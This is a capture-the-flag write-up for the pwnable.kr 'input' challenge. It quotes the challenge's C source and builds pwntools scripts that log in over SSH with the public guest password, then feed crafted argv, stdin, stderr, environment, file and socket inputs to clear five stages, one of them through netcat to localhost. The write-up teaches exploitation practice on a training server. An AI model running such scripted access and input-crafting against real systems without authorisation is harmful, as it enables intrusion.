# input

```
Mom? how can I pass my input to a computer program?

ssh input2@pwnable.kr -p2222 (pw:guest)
```

The file we are inputting to looks like this.

```
(ctf-python) [huck@knuth] cat input.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
	printf("Welcome to pwnable.kr\n");
	printf("Let's see if you know how to give input to program\n");
	printf("Just give me correct inputs then you will get the flag :)\n");

	// argv
	if(argc != 100) return 0;
	if(strcmp(argv['A'],"\x00")) return 0;
	if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
	printf("Stage 1 clear!\n");	

	// stdio
	char buf[4];
	read(0, buf, 4);
	if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
	read(2, buf, 4);
        if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
	printf("Stage 2 clear!\n");
	
	// env
	if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
	printf("Stage 3 clear!\n");

	// file
	FILE* fp = fopen("\x0a", "r");
	if(!fp) return 0;
	if( fread(buf, 4, 1, fp)!=1 ) return 0;
	if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
	fclose(fp);
	printf("Stage 4 clear!\n");	

	// network
	int sd, cd;
	struct sockaddr_in saddr, caddr;
	sd = socket(AF_INET, SOCK_STREAM, 0);
	if(sd == -1){
		printf("socket error, tell admin\n");
		return 0;
	}
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = INADDR_ANY;
	saddr.sin_port = htons( atoi(argv['C']) );
	if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
		printf("bind error, use another port\n");
    		return 1;
	}
	listen(sd, 1);
	int c = sizeof(struct sockaddr_in);
	cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
	if(cd < 0){
		printf("accept error, tell admin\n");
		return 0;
	}
	if( recv(cd, buf, 4, 0) != 4 ) return 0;
	if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
	printf("Stage 5 clear!\n");

	// here's your flag
	system("/bin/cat flag");	
	return 0;
}
```

Stage one consists of argv input values. Fortunately with pwntools we can establish an ssh connection with python and run processes with whatever argv values we want. Argv[0] is the command to run we make the rest match with the code. The timeout is changed to capture all the output instead of just the welcome message.

```
from pwn import *
s = ssh(host='pwnable.kr',
        user='input2',
        password='guest',
        port=2222)

arr = [b'\x00']*100
arr[0] = b'./input'
arr[66] = b'\x20\x0a\x0d'
p = s.process(arr);
context.clear()
context.timeout = 5
print(p.recv().decode('ascii'))
```

```
(ctf-python) [huck@knuth] python3 exploit.py
[+] Connecting to pwnable.kr on port 2222: Done
[+] Opening new channel: execve(b'./input', [b'./input', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b' \n\r', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', ...: Done
Welcome to pwnable.kr
Let's see if you know how to give input to program
Just give me correct inputs then you will get the flag :)
```

On to stage 2 and 3. We need to be able to send data to stdin (fd 0) and stderr (fd 2). Pwntools allows us to easily input on stdin, but for stderr we need to read from a file on the server. I just made a temporary file and read from that. Setting environment variables for stage 3 is pretty easy in Pwntools as well so I went ahead and did that.

```
from pwn import *
import os
s = ssh(host='pwnable.kr',
        user='input2',
        password='guest',
        port=2222)
  
arr = [b'\x00']*100
arr[0] = './input'
arr[66] = b'\x20\x0a\x0d'

p = s.process(['cat', '-'], stdout='/tmp/huck/stderr')
p.sendline(b'\x00\x0a\x02\xff')
p.kill()

p = s.process(arr, stderr='/tmp/huck/stderr', env={b'\xde\xad\xbe\xef': b'\xca\xfe\xba\xbe'});
p.sendline(b'\x00\x0a\x00\xff')	
p.interactive()
```

```
(ctf-python) [huck@knuth] python3 exploit.py
[+] Connecting to pwnable.kr on port 2222: Done
[+] Opening new channel: execve(b'cat', [b'cat', b'-'], os.environ): Done
[*] Closed SSH channel with pwnable.kr
[+] Opening new channel: execve(b'./input', [b'./input', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b' \n\r', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', ...: Done
[*] Switching to interactive mode
Welcome to pwnable.kr
Let's see if you know how to give input to program
Just give me correct inputs then you will get the flag :)
Stage 1 clear!
Stage 2 clear!
Stage 3 clear!
[*] Got EOF while reading in interactive
```

For stage 4 we need to read from a file. We can change our cwd using pwntools and use relative paths to create a file. We truncate to remove the newline added by cat.

```
from pwn import *
import os
s = ssh(host='pwnable.kr',
        user='input2',
        password='guest',
        port=2222)
  
arr = [b'\x00']*100
arr[0] = 'input'
arr[66] = b'\x20\x0a\x0d'

p = s.process(['cat', '-'], stdout='/tmp/huck/stderr')
p.sendline(b'\x00\x0a\x02\xff')
p.kill()

p = s.process(['cat', '-'], stdout=b'/tmp/huck/\x0a')
p.sendline(b'\x00'*4) 
p.kill()

p = s.process(['truncate', '-s-1', '/tmp/huck/\x0a'])

p = s.process(arr, stderr='/tmp/huck/stderr', env={b'\xde\xad\xbe\xef': b'\xca\xfe\xba\xbe'}, cwd="/tmp/huck/");
p.sendline(b'\x00\x0a\x00\xff')
p.interactive()
```

```
(ctf-python) [huck@knuth] python3 exploit.py
[+] Connecting to pwnable.kr on port 2222: Done
[+] Opening new channel: execve(b'cat', [b'cat', b'-'], os.environ): Done
[*] Closed SSH channel with pwnable.kr
[+] Opening new channel: execve(b'cat', [b'cat', b'-'], os.environ): Done
[*] Closed SSH channel with pwnable.kr
[+] Opening new channel: execve(b'truncate', [b'truncate', b'-s-1', b'/tmp/huck/\n'], os.environ): Done
[+] Opening new channel: execve(b'input', [b'input', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b' \n\r', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'',...: Done
[*] Switching to interactive mode
Welcome to pwnable.kr
Let's see if you know how to give input to program
Just give me correct inputs then you will get the flag :)
Stage 1 clear!
Stage 2 clear!
Stage 3 clear!
Stage 4 clear!
$
```

I started a new shell to connect to the server, unfortunately this didn't work because of the system() call. Although the challenge should be finished, it does not give me the flag. :(

```
from pwn import *
import os
s = ssh(host='pwnable.kr',
        user='input2',
        password='guest',
        port=2222)

sock_port = 8999;
  
arr = [b'\x00']*100
arr[0] = 'input'
arr[66] = b'\x20\x0a\x0d'
arr[67] = str(sock_port)

p = s.process(['cat', '-'], stdout='/tmp/huck/stderr')
p.sendline(b'\x00\x0a\x02\xff')
p.kill()

p = s.process(['cat', '-'], stdout=b'/tmp/huck/\x0a') 
p.sendline(b'\x00'*4)
p.kill()

p = s.process(['truncate', '-s-1', '/tmp/huck/\x0a'])

shell = s.shell('/bin/sh', tty=True)
p = s.process(arr, stderr='/tmp/huck/stderr', env={b'\xde\xad\xbe\xef': b'\xca\xfe\xba\xbe'}, cwd="/tmp/huck/", run=False);

shell.sendline(p)
shell.sendline(b'\x00\x0a\x00\xff')

shell2 = s.shell('/bin/sh')
shell2.sendline('python -c "print \'\\xde\\xad\\xbe\\xef\'" | nc localhost '+str(sock_port));

shell.interactive()
```

```
(ctf-python) [huck@knuth] python3 exploit.py
[+] Connecting to pwnable.kr on port 2222: Done
[+] Opening new channel: execve(b'cat', [b'cat', b'-'], os.environ): Done
[*] Closed SSH channel with pwnable.kr
[+] Opening new channel: execve(b'cat', [b'cat', b'-'], os.environ): Done
[*] Closed SSH channel with pwnable.kr
[+] Opening new channel: execve(b'truncate', [b'truncate', b'-s-1', b'/tmp/huck/\n'], os.environ): Done
[+] Opening new channel: '/bin/sh': Done
[*] Uploading execve script to /tmp/pwnlib-execve-RImVzCgr9f
[+] Opening new channel: '/bin/sh': Done
[*] Switching to interactive mode
$ Welcome to pwnable.kr
Let's see if you know how to give input to program
Just give me correct inputs then you will get the flag :)
Stage 1 clear!
Stage 2 clear!
Stage 3 clear!
Stage 4 clear!
Stage 5 clear!
```
